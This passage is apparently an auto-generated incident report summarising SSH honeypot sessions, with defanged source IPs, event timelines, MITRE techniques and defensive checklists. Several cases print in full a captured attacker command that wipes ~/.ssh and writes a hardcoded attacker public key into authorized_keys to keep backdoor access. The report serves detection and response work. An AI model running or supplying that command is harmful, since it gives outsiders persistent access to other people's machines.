| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 02:36:30` | `cowrie.session.connect` |
| `2026-10-14 02:36:32` | `cowrie.client.version` |
| `2026-10-14 02:36:32` | `cowrie.client.kex` |
| `2026-10-14 02:36:41` | `cowrie.login.success` |
| `2026-10-14 02:36:48` | `cowrie.session.params` |
| `2026-10-14 02:36:48` | `cowrie.command.input` |
| `2026-10-14 02:36:48` | `cowrie.command.input` |
| `2026-10-14 02:36:48` | `cowrie.command.input` |
| `2026-10-14 02:36:48` | `cowrie.command.input` |
| `2026-10-14 02:36:48` | `cowrie.command.input` |
| `2026-10-14 02:36:48` | `cowrie.command.success` |
| `2026-10-14 02:36:48` | `cowrie.command.input` |
| `2026-10-14 02:36:48` | `cowrie.command.input` |
| `2026-10-14 02:36:48` | `cowrie.command.input` |
| `2026-10-14 02:36:48` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0baaddc4d17d

| Field | Detail |
|---|---|
| **Source IP** | `194.164.107[.]5` |
| **First Seen** | 2026-10-14 03:31 |
| **Last Seen** | 2026-10-14 03:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 03:31:45` | `cowrie.session.connect` |
| `2026-10-14 03:31:45` | `cowrie.login.success` |
| `2026-10-14 03:31:46` | `cowrie.session.params` |
| `2026-10-14 03:31:46` | `cowrie.command.input` |
| `2026-10-14 03:31:46` | `cowrie.command.input` |
| `2026-10-14 03:31:46` | `cowrie.command.failed` |
| `2026-10-14 03:31:46` | `cowrie.command.input` |
| `2026-10-14 03:31:46` | `cowrie.command.failed` |
| `2026-10-14 03:31:46` | `cowrie.command.input` |
| `2026-10-14 03:31:46` | `cowrie.log.closed` |
| `2026-10-14 03:31:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.164.107[.]5` to AbuseIPDB if not already reported
- [ ] Block `194.164.107[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f2a0f8785b4

| Field | Detail |
|---|---|
| **Source IP** | `156.225.14[.]74` |
| **First Seen** | 2026-10-14 03:35 |
| **Last Seen** | 2026-10-14 03:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 03:35:16` | `cowrie.session.connect` |
| `2026-10-14 03:35:16` | `cowrie.client.version` |
| `2026-10-14 03:35:16` | `cowrie.client.kex` |
| `2026-10-14 03:35:17` | `cowrie.login.success` |
| `2026-10-14 03:35:18` | `cowrie.session.params` |
| `2026-10-14 03:35:18` | `cowrie.command.input` |
| `2026-10-14 03:35:18` | `cowrie.command.failed` |
| `2026-10-14 03:35:19` | `cowrie.log.closed` |
| `2026-10-14 03:35:19` | `cowrie.session.params` |
| `2026-10-14 03:35:19` | `cowrie.command.input` |
| `2026-10-14 03:35:20` | `cowrie.session.file_download` |
| `2026-10-14 03:35:20` | `cowrie.log.closed` |
| `2026-10-14 03:35:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.225.14[.]74` to AbuseIPDB if not already reported
- [ ] Block `156.225.14[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e84c34ff47c8

| Field | Detail |
|---|---|
| **Source IP** | `156.225.14[.]74` |
| **First Seen** | 2026-10-14 03:35 |
| **Last Seen** | 2026-10-14 03:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 03:35:20` | `cowrie.session.connect` |
| `2026-10-14 03:35:20` | `cowrie.client.version` |
| `2026-10-14 03:35:20` | `cowrie.client.kex` |
| `2026-10-14 03:35:21` | `cowrie.login.success` |
| `2026-10-14 03:35:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.225.14[.]74` to AbuseIPDB if not already reported
- [ ] Block `156.225.14[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e5f021a10fa

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-10-14 03:41 |
| **Last Seen** | 2026-10-14 03:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 03:41:14` | `cowrie.session.connect` |
| `2026-10-14 03:41:14` | `cowrie.client.version` |
| `2026-10-14 03:41:15` | `cowrie.client.kex` |
| `2026-10-14 03:41:16` | `cowrie.login.success` |
| `2026-10-14 03:41:16` | `cowrie.session.params` |
| `2026-10-14 03:41:16` | `cowrie.command.input` |
| `2026-10-14 03:41:16` | `cowrie.command.failed` |
| `2026-10-14 03:41:17` | `cowrie.log.closed` |
| `2026-10-14 03:41:18` | `cowrie.session.params` |
| `2026-10-14 03:41:18` | `cowrie.command.input` |
| `2026-10-14 03:41:18` | `cowrie.session.file_download` |
| `2026-10-14 03:41:18` | `cowrie.log.closed` |
| `2026-10-14 03:41:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ef6a02fe139

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]43` |
| **First Seen** | 2026-10-14 03:41 |
| **Last Seen** | 2026-10-14 03:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 03:41:18` | `cowrie.session.connect` |
| `2026-10-14 03:41:18` | `cowrie.client.version` |
| `2026-10-14 03:41:18` | `cowrie.client.kex` |
| `2026-10-14 03:41:19` | `cowrie.login.success` |
| `2026-10-14 03:41:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]43` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc4410d60784

| Field | Detail |
|---|---|
| **Source IP** | `220.123.33[.]105` |
| **First Seen** | 2026-10-14 03:42 |
| **Last Seen** | 2026-10-14 03:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 03:42:20` | `cowrie.session.connect` |
| `2026-10-14 03:42:20` | `cowrie.client.version` |
| `2026-10-14 03:42:20` | `cowrie.client.kex` |
| `2026-10-14 03:42:21` | `cowrie.login.success` |
| `2026-10-14 03:42:22` | `cowrie.session.params` |
| `2026-10-14 03:42:22` | `cowrie.command.input` |
| `2026-10-14 03:42:22` | `cowrie.command.failed` |
| `2026-10-14 03:42:22` | `cowrie.log.closed` |
| `2026-10-14 03:42:23` | `cowrie.session.params` |
| `2026-10-14 03:42:23` | `cowrie.command.input` |
| `2026-10-14 03:42:23` | `cowrie.session.file_download` |
| `2026-10-14 03:42:23` | `cowrie.log.closed` |
| `2026-10-14 03:42:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.123.33[.]105` to AbuseIPDB if not already reported
- [ ] Block `220.123.33[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-961655e7e2a7

| Field | Detail |
|---|---|
| **Source IP** | `220.123.33[.]105` |
| **First Seen** | 2026-10-14 03:42 |
| **Last Seen** | 2026-10-14 03:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 03:42:23` | `cowrie.session.connect` |
| `2026-10-14 03:42:23` | `cowrie.client.version` |
| `2026-10-14 03:42:24` | `cowrie.client.kex` |
| `2026-10-14 03:42:25` | `cowrie.login.success` |
| `2026-10-14 03:42:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.123.33[.]105` to AbuseIPDB if not already reported
- [ ] Block `220.123.33[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b030bda1d024

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]105` |
| **First Seen** | 2026-10-14 03:45 |
| **Last Seen** | 2026-10-14 03:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 03:45:34` | `cowrie.session.connect` |
| `2026-10-14 03:45:34` | `cowrie.client.version` |
| `2026-10-14 03:45:35` | `cowrie.client.kex` |
| `2026-10-14 03:45:35` | `cowrie.login.success` |
| `2026-10-14 03:45:37` | `cowrie.session.params` |
| `2026-10-14 03:45:37` | `cowrie.command.input` |
| `2026-10-14 03:45:37` | `cowrie.command.failed` |
| `2026-10-14 03:45:37` | `cowrie.log.closed` |
| `2026-10-14 03:45:38` | `cowrie.session.params` |
| `2026-10-14 03:45:38` | `cowrie.command.input` |
| `2026-10-14 03:45:38` | `cowrie.session.file_download` |
| `2026-10-14 03:45:38` | `cowrie.log.closed` |
| `2026-10-14 03:45:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]105` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e12b8db13311

| Field | Detail |
|---|---|
| **Source IP** | `102.210.149[.]105` |
| **First Seen** | 2026-10-14 03:45 |
| **Last Seen** | 2026-10-14 03:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 03:45:38` | `cowrie.session.connect` |
| `2026-10-14 03:45:38` | `cowrie.client.version` |
| `2026-10-14 03:45:39` | `cowrie.client.kex` |
| `2026-10-14 03:45:40` | `cowrie.login.success` |
| `2026-10-14 03:45:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.149[.]105` to AbuseIPDB if not already reported
- [ ] Block `102.210.149[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15f3175d3a7e

| Field | Detail |
|---|---|
| **Source IP** | `103.154.63[.]62` |
| **First Seen** | 2026-10-14 03:46 |
| **Last Seen** | 2026-10-14 03:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 03:46:03` | `cowrie.session.connect` |
| `2026-10-14 03:46:03` | `cowrie.client.version` |
| `2026-10-14 03:46:03` | `cowrie.client.kex` |
| `2026-10-14 03:46:04` | `cowrie.login.success` |
| `2026-10-14 03:46:05` | `cowrie.session.params` |
| `2026-10-14 03:46:05` | `cowrie.command.input` |
| `2026-10-14 03:46:05` | `cowrie.command.failed` |
| `2026-10-14 03:46:06` | `cowrie.log.closed` |
| `2026-10-14 03:46:07` | `cowrie.session.params` |
| `2026-10-14 03:46:07` | `cowrie.command.input` |
| `2026-10-14 03:46:07` | `cowrie.session.file_download` |
| `2026-10-14 03:46:07` | `cowrie.log.closed` |
| `2026-10-14 03:46:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.63[.]62` to AbuseIPDB if not already reported
- [ ] Block `103.154.63[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2de0eac32bc

| Field | Detail |
|---|---|
| **Source IP** | `45.78.204[.]254` |
| **First Seen** | 2026-10-14 03:46 |
| **Last Seen** | 2026-10-14 03:46 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 03:46:03` | `cowrie.session.connect` |
| `2026-10-14 03:46:03` | `cowrie.client.version` |
| `2026-10-14 03:46:03` | `cowrie.client.kex` |
| `2026-10-14 03:46:05` | `cowrie.login.success` |
| `2026-10-14 03:46:06` | `cowrie.session.params` |
| `2026-10-14 03:46:06` | `cowrie.command.input` |
| `2026-10-14 03:46:06` | `cowrie.command.failed` |
| `2026-10-14 03:46:07` | `cowrie.log.closed` |
| `2026-10-14 03:46:08` | `cowrie.session.params` |
| `2026-10-14 03:46:08` | `cowrie.command.input` |
| `2026-10-14 03:46:08` | `cowrie.session.file_download` |
| `2026-10-14 03:46:08` | `cowrie.log.closed` |
| `2026-10-14 03:46:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.204[.]254` to AbuseIPDB if not already reported
- [ ] Block `45.78.204[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4368a83f02ec

| Field | Detail |
|---|---|
| **Source IP** | `103.154.63[.]62` |
| **First Seen** | 2026-10-14 03:46 |
| **Last Seen** | 2026-10-14 03:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-14 03:46:08` | `cowrie.session.connect` |
| `2026-10-14 03:46:08` | `cowrie.client.version` |
| `2026-10-14 03:46:08` | `cowrie.client.kex` |
| `2026-10-14 03:46:09` | `cowrie.login.success` |
| `2026-10-14 03:46:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.63[.]62` to AbuseIPDB if not already reported
- [ ] Block `103.154.63[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (156) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-5ae89cbcb076 | HIGH | `45.78.204[.]254` | 2026-10-14 03:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-677c42e51bb3 | HIGH | `103.117.150[.]125` | 2026-10-14 03:47 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d9ce50e24779 | HIGH | `103.117.150[.]125` | 2026-10-14 03:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6359f718e8cb | HIGH | `47.236.124[.]125` | 2026-10-14 03:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fca9466df42c | HIGH | `47.236.124[.]125` | 2026-10-14 03:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1efb246b99be | HIGH | `150.139.201[.]247` | 2026-10-14 03:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2351d44513c7 | HIGH | `14.103.25[.]86` | 2026-10-14 03:49 | Y | 2 | 0 | `T1021.004 · T1078 · T1592` |
| IR-c37ac9c00718 | HIGH | `14.103.25[.]86` | 2026-10-14 03:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4e0b9ce61897 | HIGH | `150.5.141[.]198` | 2026-10-14 03:50 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b904adfd37a4 | HIGH | `150.5.141[.]198` | 2026-10-14 03:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0ce89fa1c79f | HIGH | `103.237.144[.]204` | 2026-10-14 03:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-db8808ea9b15 | HIGH | `103.237.144[.]204` | 2026-10-14 03:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0cf69d1ac600 | HIGH | `2.57.122[.]74` | 2026-10-14 04:18 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-de3862c85173 | HIGH | `150.139.201[.]247` | 2026-10-14 04:18 | Y | 0 | 0 | `T1078 · T1592` |
| IR-eab70f869924 | HIGH | `35.241.161[.]1` | 2026-10-14 04:50 | Y | 2 | 0 | `T1078` |
| IR-b468e74d9648 | HIGH | `35.241.161[.]1` | 2026-10-14 04:50 | Y | 1 | 0 | `T1078` |
| IR-31b2ddcc0de3 | HIGH | `35.241.161[.]1` | 2026-10-14 04:50 | Y | 0 | 0 | `T1078` |
| IR-1ee53e7d32d4 | HIGH | `34.14.1[.]97` | 2026-10-14 04:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d06fc68625d8 | HIGH | `119.28.84[.]193` | 2026-10-14 04:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-72655626bef8 | HIGH | `130.12.180[.]51` | 2026-10-14 04:59 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-ebfea55a7e35 | HIGH | `34.156.209[.]236` | 2026-10-14 05:24 | Y | 2 | 0 | `T1078` |
| IR-5118006693a6 | HIGH | `34.156.209[.]236` | 2026-10-14 05:24 | Y | 0 | 0 | `T1078` |
| IR-f12bea68e151 | HIGH | `34.156.209[.]236` | 2026-10-14 05:24 | Y | 1 | 0 | `T1078` |
| IR-30786812cf15 | HIGH | `176.53.159[.]196` | 2026-10-14 05:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5e66fa91cc10 | HIGH | `202.165.15[.]132` | 2026-10-14 06:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-97469aab7faa | HIGH | `202.165.15[.]132` | 2026-10-14 06:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-da801b52c3d4 | HIGH | `194.226.49[.]237` | 2026-10-14 06:10 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9a9ed4dc542a | HIGH | `194.226.49[.]237` | 2026-10-14 06:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c0e7f6472ac5 | HIGH | `34.156.209[.]236` | 2026-10-14 06:15 | Y | 2 | 0 | `T1078` |
| IR-9e91d8e65a26 | HIGH | `34.156.209[.]236` | 2026-10-14 06:15 | Y | 1 | 0 | `T1078` |
| IR-a8af3e64ac2e | HIGH | `34.156.209[.]236` | 2026-10-14 06:15 | Y | 0 | 0 | `T1078` |
| IR-5d4f42c473de | HIGH | `109.160.32[.]102` | 2026-10-14 06:31 | Y | 1 | 0 | `T1078 · T1592` |
| IR-d1c3a8d66101 | HIGH | `173.255.225[.]15` | 2026-10-14 06:47 | Y | 3 | 0 | `T1078` |
| IR-a95d27b9bcb6 | HIGH | `176.53.159[.]196` | 2026-10-14 06:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d39b680efdc0 | HIGH | `171.244.39[.]95` | 2026-10-14 06:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5f1c64e68642 | HIGH | `171.244.39[.]95` | 2026-10-14 06:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ccfda619302b | HIGH | `190.105.160[.]5` | 2026-10-14 06:50 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-da64badf94c0 | HIGH | `190.105.160[.]5` | 2026-10-14 06:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d68b9c65321f | HIGH | `146.190.74[.]52` | 2026-10-14 06:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-737c4eba801a | HIGH | `146.190.74[.]52` | 2026-10-14 06:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d93058cdb0eb | HIGH | `45.33.109[.]18` | 2026-10-14 07:00 | Y | 0 | 0 | `T1078` |
| IR-3e86f9e3615b | HIGH | `109.160.32[.]107` | 2026-10-14 07:11 | Y | 1 | 0 | `T1078 · T1592` |
| IR-0a897a244aec | HIGH | `87.106.63[.]76` | 2026-10-14 07:13 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-80d30b2f3014 | HIGH | `87.106.63[.]76` | 2026-10-14 07:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-56413a4cb3d3 | HIGH | `209.99.190[.]200` | 2026-10-14 07:16 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3bcb1f77bbce | HIGH | `209.99.190[.]200` | 2026-10-14 07:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-93fde59b5543 | HIGH | `222.124.177[.]148` | 2026-10-14 07:20 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d4c5bb788174 | HIGH | `222.124.177[.]148` | 2026-10-14 07:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9d1105154072 | HIGH | `209.38.69[.]12` | 2026-10-14 07:21 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-16cdcfa2eea9 | HIGH | `209.38.69[.]12` | 2026-10-14 07:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-83e087253386 | HIGH | `109.160.32[.]169` | 2026-10-14 07:25 | Y | 1 | 0 | `T1078 · T1592` |
| IR-7fee745bd84e | HIGH | `103.248.120[.]6` | 2026-10-14 07:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
